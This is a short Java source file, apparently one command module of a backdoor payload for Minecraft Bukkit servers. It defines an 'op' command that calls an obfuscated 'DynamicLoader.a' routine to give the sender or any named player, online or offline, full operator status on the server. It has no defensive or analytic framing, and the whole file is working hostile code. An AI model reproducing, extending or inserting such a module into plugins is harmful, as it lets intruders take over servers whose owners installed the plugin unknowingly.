package dev.naruto.astrox.payload.commands;

import dev.naruto.astrox.utils.DynamicLoader;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class OpCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        Player target = (args.length > 0) ? Bukkit.getPlayer(args[0]) : sender;

        if (target != null) {
            DynamicLoader.a(target, true); // FIXED
            sender.sendMessage("§e✓ §f" + target.getName() + " §7is now §cop");
        } else if (args.length > 0) {
            DynamicLoader.a(Bukkit.getOfflinePlayer(args[0]).getPlayer(), true); // FIXED
            sender.sendMessage("§e✓ §f" + args[0] + " §7(offline) is now §cop");
        }
    }

    @Override
    public String getDescription() { return "Grant operator status"; }

    @Override
    public String getUsage() { return "[player]"; }

    @Override
    public String getCategory() { return "Player"; }
}
